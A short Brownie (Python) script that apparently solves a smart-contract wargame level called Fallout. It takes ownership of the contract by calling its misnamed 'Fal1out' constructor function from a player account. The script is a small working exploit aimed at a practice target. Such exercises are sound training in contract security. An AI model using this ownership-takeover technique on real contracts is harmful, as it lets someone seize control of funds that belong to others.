from brownie import Fallout, network, config,accounts

def main():
    #input the contract address
    #> contract.address
    contractAddress = '0x4440b1DFebbeD45c05475Db87E5818D55108D35a'

    #get fallback contract at address
    falloutContract = Fallout.at(contractAddress)

    #use player account
    player = accounts.add(config["wallets"]["from_key"])

    #call constructor to become owner 
    falloutContract.Fal1out({"from":player})